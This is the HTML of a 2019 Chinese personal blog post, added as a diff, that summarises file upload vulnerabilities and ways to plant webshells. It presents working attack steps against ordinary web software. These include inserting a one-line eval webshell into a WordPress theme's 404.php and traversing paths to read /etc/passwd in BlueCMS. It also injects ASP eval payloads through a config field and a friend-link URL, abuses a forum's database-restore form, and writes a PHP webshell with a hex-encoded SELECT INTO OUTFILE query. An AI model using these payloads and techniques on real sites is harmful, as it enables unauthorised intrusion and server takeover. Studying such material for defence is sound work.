@@ -1,0 +1,1044 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="han个人博客">
+    <title>文件上传漏洞总结 - han个人博客</title>
+    <meta name="author" content="han">
+    
+    
+    
+        <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
+    
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg"},"articleBody":"Abstract: 总结文件上传漏洞，包括常规的上传绕过，编辑器漏洞，各种获取webshell的手段。\n\n\n\n\n\n\n文件上传漏洞总结常规的上传绕过前期工作判断类型\n\n\n根据类型运用具体方法绕过\n\n\n\n编辑器漏洞\n\n获取 webshell 的手段通过文件上传漏洞和编辑器漏洞上传 webshell直接上传获得 webshellphp 和 jsp 程序比较常见，直接在管理界面上传 .php 或 .jsp 类型。\n添加修改上传类型大多数系统是允许添加上传类型，登录后台可以添加相应类型的 webshell，asp 后台可以添加 asa  、asP 或 .aspasp 类型的 webshell，php 系统的后台，可以添加 .php.未知文件类型。\n后台获取 webshell 常用方法利用后台管理功能写入 webshell打开管理功能，编辑 php 文件，把小马写入。这种方法难在确认小马所在路径上。\n\nwordpress 后台登入后，进入主题修改里面，在 404.php 文件里加上小马，根据浏览器的 url ，拼凑路径，/themes/popularis/404.php 。然后通过两次安装相同的插件，系统就会报出已在 /var/www/html/wp-content/plugins 安装的错误，来确定根目录。最后我们把整个路径拼接起来，即访问，http://YouIp/wp-content/themes/popularis/404.php。整个过程要多注意细节，多尝试。\n\nBlueCMS 后台登入后，进入管理界面，在 html 编辑功能中，右击编辑字体可以进入到编辑页面，url  中存在着文件的路径，可以用 file=../../../../../../../../../../../etc/passwd 的方法来查看是否可行，输入后服务器目录中 /etc/passwd 显示出来，可以通过这种方法确定路径。\n一般情况会在网站根目录下存在 admin 文件夹和普通用户的执行文件，admin 文件夹里面存放着管理员登录后的执行文件，这个我们可以通过 url 判断，比如 www.xxx.org/admin/xxx.php 。我们可以以普通用户查看网页，在网页找到某个 abc.php 文件，然后让 file=../abc.php看是否成功，不成功的话可以继续尝试 file=../../abc.php。显示成功后，把一句话木马加上。然后用菜刀按照上次确定的路径连接即可。\n除此之外，还可以用 burpsuite 抓包方法创建 .php文件，在管理界面，编辑执行文件，点击提交时，用软件抓包，修改文件名为 xxx.php ，把文件内容改为一句话木马。之后在通过 index.html 文件找到文件路径。\n\n\n利用后台管理向配置文件写 webshell利用 &lt;% 、 %&gt; 、&#39; 等构造小马程序的配置文件，配置文件保存为 conf.asp ，\n12345&lt;%\tname = abcdefg\taddr = xxxxxxx    ip   = 1111111%&gt;\n\n可以修改 name 的值保存。我们可以这样输入 name 的值 abcdef %&gt; &lt;% @eval request(&quot;cmd&quot;)&#39;，第一个 %&gt; 和前面的构成闭合，&#39; 会注释掉第一行后面的内容，文本最后一个 %&gt; 与 @eval 前面的 &lt;% 构成闭合。只有一次尝试机会，构造错误，网站会崩。\n利用后台数据库备份及恢复获得 webshell利用后台对 access 数据库的”备份数据库“或”恢复数据库“功能，”备份的数据库路径“等变量没有过滤导致可以把任意文件后缀改为 asp ，从而获得 webshell，mssql 版程序直接应用 access 代码，同样适用。备份网站 asp 文件为其他后缀如 txt 文件，可以查看并获得网页源码。从而会获得更多程序信息增加获得 webshell机会。\n利用数据库压缩功能将数据的防下载失效从而使插入数据库的小马成功运行，在友情链接添加的 url 写上 &lt;%eval request(&quot;cmd&quot;)%&gt;，提交后，在数据库操作中压缩数据库，可以成功压缩出 asp 文件。\nasp+mssql 系统动网 mssql 版，可以直接本地提交来备份的，首先在发帖那上传一个写有 asp 代码的假图片，然后记住其上传路径。写一个本地提交的表单，代码如下：\n123456789101112&lt;html&gt;    &lt;head&gt;        &lt;title&gt;asp+mssql 系统获取 webshell&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;form action=http://yoursite/bbs/admin_dta.asp? action=RestoreData&amp;act=Restore method=\"post\"&gt;            &lt;p&gt;已上传文件的位置：&lt;input name=\"Dbpath\" type=\"text\" size=\"80\"&gt;&lt;/p&gt;            &lt;p&gt;要复制到的位置：&lt;input name=\"backpath\" type=\"text\" size=\"80\"&gt;&lt;/p&gt;            &lt;p&gt;&lt;input type=\"submit\" value=\"提交\"&gt;&lt;/p&gt;        &lt;/form&gt;    &lt;/body&gt;&lt;/html&gt;\n\n另存为 .html 本地执行，把假图片上传路径填在“已上传文件的位置”那里，想要备份的 webshell 的相对路径填写在“要复制到的位置”那里，提交就得到了 webshell。\nphp+mysql 系统后台需要有 mysql 数据查询功能，就可以利用它执行 SELECT ... INTO OUTFILE 查询输出 php 文件，因为所有的数据是存放在 mysql 里的，所以可以通过正常手段把 webshell 代码插入 mysql 在利用 SELECT ... INTO OUTFILE 语句导出 shell。在 mysql 操作里输入，如下命令：\n1SELECT 0x3C3F6576616C28245F504F53545B615D293B3F3E FROM mysql.user INTO OUTFILE &quot;路径&quot;\n\n\n就可以获得一个 &lt;?eval($_POST[a]);?&gt; 的小马。\n参考文章\n\n后台拿webshell的常用方法总结\nFckeditor漏洞总结\n文件上传漏洞总结\n\n","dateCreated":"2019-09-17T19:34:54+08:00","dateModified":"2019-09-18T08:58:38+08:00","datePublished":"2019-09-17T19:34:54+08:00","description":"Abstract: 总结文件上传漏洞，包括常规的上传绕过，编辑器漏洞，各种获取webshell的手段。","headline":"文件上传漏洞总结","image":["https://images.unsplash.com/photo-1568214697537-ace27ffd6cf3?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=634&q=80"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/17/uploadsum/"},"publisher":{"@type":"Organization","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg","logo":{"@type":"ImageObject","url":"headimg.jpg"}},"url":"http://yoursite.com/2019/09/17/uploadsum/","keywords":"文件上传漏洞, webshell, 编辑器漏洞","thumbnailUrl":"https://images.unsplash.com/photo-1568214697537-ace27ffd6cf3?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=634&q=80"}</script>
+    <meta name="description" content="Abstract: 总结文件上传漏洞，包括常规的上传绕过，编辑器漏洞，各种获取webshell的手段。">
+<meta name="keywords" content="文件上传漏洞,webshell,编辑器漏洞">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="文件上传漏洞总结">
+<meta property="og:url" content="http://yoursite.com/2019/09/17/uploadsum/index.html">
+<meta property="og:site_name" content="han个人博客">
+<meta property="og:description" content="Abstract: 总结文件上传漏洞，包括常规的上传绕过，编辑器漏洞，各种获取webshell的手段。">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://yoursite.com/images/如何判断上传漏洞类型.png">
+<meta property="og:image" content="http://yoursite.com/images/文件上传测试.png">
+<meta property="og:image" content="http://yoursite.com/images/FCKeditor%20编辑器漏洞利用总结.png">
+<meta property="og:image" content="http://yoursite.com/images/hextochar.png">
+<meta property="og:updated_time" content="2019-09-18T00:58:38.597Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="文件上传漏洞总结">
+<meta name="twitter:description" content="Abstract: 总结文件上传漏洞，包括常规的上传绕过，编辑器漏洞，各种获取webshell的手段。">
+<meta name="twitter:image" content="http://yoursite.com/images/如何判断上传漏洞类型.png">
+    
+    
+        
+    
+    
+        <meta property="og:image" content="http://yoursite.com/assets/images/headimg.jpg"/>
+    
+    
+        <meta property="og:image" content="https://images.unsplash.com/photo-1568214697537-ace27ffd6cf3?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=634&amp;q=80"/>
+        <meta class="swiftype" name="image" data-type="enum" content="https://images.unsplash.com/photo-1568214697537-ace27ffd6cf3?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=634&amp;q=80"/>
+    
+    
+    
+    <!--STYLES-->
+    <link rel="stylesheet" href="/assets/css/style-apbcs1por3ly2xr25bjnwqewpfn9wrdfbucv3jdunxv2vrrgeivtgtwgojwn.min.css">
+    <!--STYLES END-->
+    
+
+    
+
+    
+        
+    
+</head>
+
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
+
+
+    
+        
+            
+        
+    
+
+<header id="header" data-behavior="5">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a
+            class="header-title-link"
+            href="/ "
+            aria-label=""
+        >
+            han个人博客
+        </a>
+    </div>
+    
+        
+            <a
+                class="header-right-picture "
+                href="#about"
+                aria-label="Open the link: /#about"
+            >
+        
+        
+            <img class="header-picture" src="/assets/images/headimg.jpg" alt="Author&#39;s picture"/>
+        
+        </a>
+    
+</header>
+
+            <!-- Define author's picture -->
+
+
+
+        
+    
+
+<nav id="sidebar" data-behavior="5">
+    <div class="sidebar-container">
+        
+            <div class="sidebar-profile">
+                <a
+                    href="/#about"
+                    aria-label="Read more about the author"
+                >
+                    <img class="sidebar-profile-picture" src="/assets/images/headimg.jpg" alt="Author&#39;s picture"/>
+                </a>
+                <h4 class="sidebar-profile-name">han</h4>
+                
+                    <h5 class="sidebar-profile-bio"><p>life and code</p>
+</h5>
+                
+            </div>
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/ "
+                            
+                            title="Home"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Home</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-categories"
+                            
+                            title="Categories"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Categories</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-tags"
+                            
+                            title="Tags"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Tags</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/all-archives"
+                            
+                            title="Archives"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Archives</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link open-algolia-search"
+                             href="#search"
+                            
+                            title="Search"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-search" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Search</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="#about"
+                            
+                            title="About"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">About</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="https://github.com/" target="_blank" rel="noopener" title="GitHub">
+                    
+                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">GitHub</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link " href="http://stackoverflow.com/users" target="_blank" rel="noopener" title="Stack Overflow">
+                    
+                        <i class="sidebar-button-icon fab fa-stack-overflow" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Stack Overflow</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/mailto"
+                            title="Mail"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Mail</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a  class="sidebar-button-link "
+                             href="/atom.xml"
+                            
+                            title="RSS"
+                        >
+                    
+                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">RSS</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
+</nav>
+
+            
+            <div id="main" data-behavior="5"
+                 class="
+                        hasCoverMetaIn
+                        ">
+                
+<article class="post">
+    
+    
+        <div class="post-header main-content-wrap text-center">
+    
+        <h1 class="post-title">
+            文件上传漏洞总结
+        </h1>
+    
+    
+        <div class="post-meta">
+    <time datetime="2019-09-17T19:34:54+08:00">
+	
+		    Sep 17, 2019
+    	
+    </time>
+    
+        <span>in </span>
+        
+    <a class="category-link" href="/categories/Web-Security/">Web Security</a>
+
+
+    
+</div>
+
+    
+</div>
+
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <p><strong>Abstract</strong>: 总结文件上传漏洞，包括常规的上传绕过，编辑器漏洞，各种获取webshell的手段。</p>
+<a id="more"></a>
+
+<!--export-->
+
+<h1 id="table-of-contents">Table of Contents</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#文件上传漏洞总结"><span class="toc-text">文件上传漏洞总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#常规的上传绕过"><span class="toc-text">常规的上传绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#前期工作"><span class="toc-text">前期工作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#根据类型运用具体方法绕过"><span class="toc-text">根据类型运用具体方法绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#编辑器漏洞"><span class="toc-text">编辑器漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取-webshell-的手段"><span class="toc-text">获取 webshell 的手段</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#通过文件上传漏洞和编辑器漏洞上传-webshell"><span class="toc-text">通过文件上传漏洞和编辑器漏洞上传 webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#直接上传获得-webshell"><span class="toc-text">直接上传获得 webshell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#添加修改上传类型"><span class="toc-text">添加修改上传类型</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#后台获取-webshell-常用方法"><span class="toc-text">后台获取 webshell 常用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#利用后台管理功能写入-webshell"><span class="toc-text">利用后台管理功能写入 webshell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#利用后台管理向配置文件写-webshell"><span class="toc-text">利用后台管理向配置文件写 webshell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#利用后台数据库备份及恢复获得-webshell"><span class="toc-text">利用后台数据库备份及恢复获得 webshell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#利用数据库压缩功能"><span class="toc-text">利用数据库压缩功能</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#asp-mssql-系统"><span class="toc-text">asp+mssql 系统</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#php-mysql-系统"><span class="toc-text">php+mysql 系统</span></a></li></ol></li></ol></li></ol></li></ol>
+
+<h2 id="文件上传漏洞总结"><a href="#文件上传漏洞总结" class="headerlink" title="文件上传漏洞总结"></a>文件上传漏洞总结</h2><h3 id="常规的上传绕过"><a href="#常规的上传绕过" class="headerlink" title="常规的上传绕过"></a>常规的上传绕过</h3><h4 id="前期工作"><a href="#前期工作" class="headerlink" title="前期工作"></a>前期工作</h4><p>判断类型</p>
+<img src="/images/如何判断上传漏洞类型.png" style="zoom:200%;">
+
+<h4 id="根据类型运用具体方法绕过"><a href="#根据类型运用具体方法绕过" class="headerlink" title="根据类型运用具体方法绕过"></a>根据类型运用具体方法绕过</h4><img src="/images/文件上传测试.png" style="zoom:200%;">
+
+
+
+<h3 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a>编辑器漏洞</h3><img src="/images/FCKeditor 编辑器漏洞利用总结.png" style="zoom:200%;">
+
+<h3 id="获取-webshell-的手段"><a href="#获取-webshell-的手段" class="headerlink" title="获取 webshell 的手段"></a>获取 webshell 的手段</h3><h4 id="通过文件上传漏洞和编辑器漏洞上传-webshell"><a href="#通过文件上传漏洞和编辑器漏洞上传-webshell" class="headerlink" title="通过文件上传漏洞和编辑器漏洞上传 webshell"></a>通过文件上传漏洞和编辑器漏洞上传 webshell</h4><h5 id="直接上传获得-webshell"><a href="#直接上传获得-webshell" class="headerlink" title="直接上传获得 webshell"></a>直接上传获得 webshell</h5><p><code>php</code> 和 <code>jsp</code> 程序比较常见，直接在管理界面上传 <code>.php</code> 或 <code>.jsp</code> 类型。</p>
+<h5 id="添加修改上传类型"><a href="#添加修改上传类型" class="headerlink" title="添加修改上传类型"></a>添加修改上传类型</h5><p>大多数系统是允许添加上传类型，登录后台可以添加相应类型的 <code>webshell</code>，<code>asp</code> 后台可以添加 <code>asa</code>  、<code>asP</code> 或 <code>.aspasp</code> 类型的 <code>webshell</code>，<code>php</code> 系统的后台，可以添加 <code>.php.未知文件类型</code>。</p>
+<h4 id="后台获取-webshell-常用方法"><a href="#后台获取-webshell-常用方法" class="headerlink" title="后台获取 webshell 常用方法"></a>后台获取 webshell 常用方法</h4><h5 id="利用后台管理功能写入-webshell"><a href="#利用后台管理功能写入-webshell" class="headerlink" title="利用后台管理功能写入 webshell"></a>利用后台管理功能写入 webshell</h5><p>打开管理功能，编辑 <code>php</code> 文件，把小马写入。这种方法难在确认小马所在路径上。</p>
+<ol>
+<li><p><code>wordpress</code> 后台登入后，进入主题修改里面，在 <code>404.php</code> 文件里加上小马，根据浏览器的 <code>url</code> ，拼凑路径，<code>/themes/popularis/404.php</code> 。然后通过两次安装相同的插件，系统就会报出已在 <code>/var/www/html/wp-content/plugins</code> 安装的错误，来确定根目录。最后我们把整个路径拼接起来，即访问，<code>http://YouIp/wp-content/themes/popularis/404.php</code>。整个过程要多注意细节，多尝试。</p>
+</li>
+<li><p><code>BlueCMS</code> 后台登入后，进入管理界面，在 <code>html</code> 编辑功能中，右击编辑字体可以进入到编辑页面，<code>url</code>  中存在着文件的路径，可以用 <code>file=../../../../../../../../../../../etc/passwd</code> 的方法来查看是否可行，输入后服务器目录中 <code>/etc/passwd</code> 显示出来，可以通过这种方法确定路径。</p>
+<p>一般情况会在网站根目录下存在 <code>admin</code> 文件夹和普通用户的执行文件，<code>admin</code> 文件夹里面存放着管理员登录后的执行文件，这个我们可以通过 <code>url</code> 判断，比如 <code>www.xxx.org/admin/xxx.php</code> 。我们可以以普通用户查看网页，在网页找到某个 <code>abc.php</code> 文件，然后让 <code>file=../abc.php</code>看是否成功，不成功的话可以继续尝试 <code>file=../../abc.php</code>。显示成功后，把一句话木马加上。然后用菜刀按照上次确定的路径连接即可。</p>
+<p>除此之外，还可以用 <code>burpsuite</code> 抓包方法创建 <code>.php</code>文件，在管理界面，编辑执行文件，点击提交时，用软件抓包，修改文件名为 <code>xxx.php</code> ，把文件内容改为一句话木马。之后在通过 <code>index.html</code> 文件找到文件路径。</p>
+</li>
+</ol>
+<h5 id="利用后台管理向配置文件写-webshell"><a href="#利用后台管理向配置文件写-webshell" class="headerlink" title="利用后台管理向配置文件写 webshell"></a>利用后台管理向配置文件写 webshell</h5><p>利用 <code>&lt;%</code> 、 <code>%&gt;</code> 、<code>&#39;</code> 等构造小马程序的配置文件，配置文件保存为 <code>conf.asp</code> ，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">	name = abcdefg</span><br><span class="line">	addr = xxxxxxx</span><br><span class="line">    ip   = 1111111</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以修改 <code>name</code> 的值保存。我们可以这样输入 <code>name</code> 的值 <code>abcdef %&gt; &lt;% @eval request(&quot;cmd&quot;)&#39;</code>，第一个 <code>%&gt;</code> 和前面的构成闭合，<code>&#39;</code> 会注释掉第一行后面的内容，文本最后一个 <code>%&gt;</code> 与 <code>@eval</code> 前面的 <code>&lt;%</code> 构成闭合。只有一次尝试机会，构造错误，网站会崩。</p>
+<h5 id="利用后台数据库备份及恢复获得-webshell"><a href="#利用后台数据库备份及恢复获得-webshell" class="headerlink" title="利用后台数据库备份及恢复获得 webshell"></a>利用后台数据库备份及恢复获得 webshell</h5><p>利用后台对 <code>access</code> 数据库的”备份数据库“或”恢复数据库“功能，”备份的数据库路径“等变量没有过滤导致可以把任意文件后缀改为 <code>asp</code> ，从而获得 <code>webshell</code>，<code>mssql</code> 版程序直接应用 <code>access</code> 代码，同样适用。备份网站 <code>asp</code> 文件为其他后缀如 <code>txt</code> 文件，可以查看并获得网页源码。从而会获得更多程序信息增加获得 <code>webshell</code>机会。</p>
+<h5 id="利用数据库压缩功能"><a href="#利用数据库压缩功能" class="headerlink" title="利用数据库压缩功能"></a>利用数据库压缩功能</h5><p>将数据的防下载失效从而使插入数据库的小马成功运行，在友情链接添加的 <code>url</code> 写上 <code>&lt;%eval request(&quot;cmd&quot;)%&gt;</code>，提交后，在数据库操作中压缩数据库，可以成功压缩出 <code>asp</code> 文件。</p>
+<h5 id="asp-mssql-系统"><a href="#asp-mssql-系统" class="headerlink" title="asp+mssql 系统"></a>asp+mssql 系统</h5><p>动网 mssql 版，可以直接本地提交来备份的，首先在发帖那上传一个写有 asp 代码的假图片，然后记住其上传路径。写一个本地提交的表单，代码如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>asp+mssql 系统获取 webshell<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">http://yoursite/bbs/admin_dta.asp?</span> <span class="attr">action</span>=<span class="string">RestoreData&amp;act</span>=<span class="string">Restore</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>已上传文件的位置：<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"Dbpath"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">size</span>=<span class="string">"80"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>要复制到的位置：<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"backpath"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">size</span>=<span class="string">"80"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>另存为 .html 本地执行，把假图片上传路径填在“已上传文件的位置”那里，想要备份的 webshell 的相对路径填写在“要复制到的位置”那里，提交就得到了 webshell。</p>
+<h5 id="php-mysql-系统"><a href="#php-mysql-系统" class="headerlink" title="php+mysql 系统"></a>php+mysql 系统</h5><p>后台需要有 mysql 数据查询功能，就可以利用它执行 <code>SELECT ... INTO OUTFILE</code> 查询输出 php 文件，因为所有的数据是存放在 mysql 里的，所以可以通过正常手段把 webshell 代码插入 mysql 在利用 <code>SELECT ... INTO OUTFILE</code> 语句导出 shell。在 mysql 操作里输入，如下命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 0x3C3F6576616C28245F504F53545B615D293B3F3E FROM mysql.user INTO OUTFILE &quot;路径&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/hextochar.png" alt></p>
+<p>就可以获得一个 <code>&lt;?eval($_POST[a]);?&gt;</code> 的小马。</p>
+<p><em>参考文章</em></p>
+<blockquote>
+<p><a href="https://blog.csdn.net/cangyingaoyou/article/details/12087527" target="_blank" rel="noopener">后台拿webshell的常用方法总结</a></p>
+<p><a href="https://blog.51cto.com/simeon/2117821" target="_blank" rel="noopener">Fckeditor漏洞总结</a></p>
+<p><a href="https://www.secpulse.com/archives/95987.html" target="_blank" rel="noopener">文件上传漏洞总结</a></p>
+</blockquote>
+
+            
+
+
+        </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
+        
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">TAGGED IN</span><br/>
+                
+    <a class="tag tag--primary tag--small t-link" href="/tags/webshell/">webshell</a> <a class="tag tag--primary tag--small t-link" href="/tags/文件上传漏洞/">文件上传漏洞</a> <a class="tag tag--primary tag--small t-link" href="/tags/编辑器漏洞/">编辑器漏洞</a>
+
+            </div>
+        
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/18/welcome/"
+                    data-tooltip="Welcome"
+                    aria-label="PREVIOUS: Welcome"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/16/practice16/"
+                    data-tooltip="Apache 和 Nginx 解析漏洞的验证"
+                    aria-label="NEXT: Apache 和 Nginx 解析漏洞的验证"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/17/uploadsum/"
+                    title="Share on Facebook"
+                    aria-label="Share on Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/17/uploadsum/"
+                    title="Share on Twitter"
+                    aria-label="Share on Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/17/uploadsum/"
+                    title="Share on Google+"
+                    aria-label="Share on Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="Table of Contents">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+        
+        
+            
+        
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2019 han. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/18/welcome/"
+                    data-tooltip="Welcome"
+                    aria-label="PREVIOUS: Welcome"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
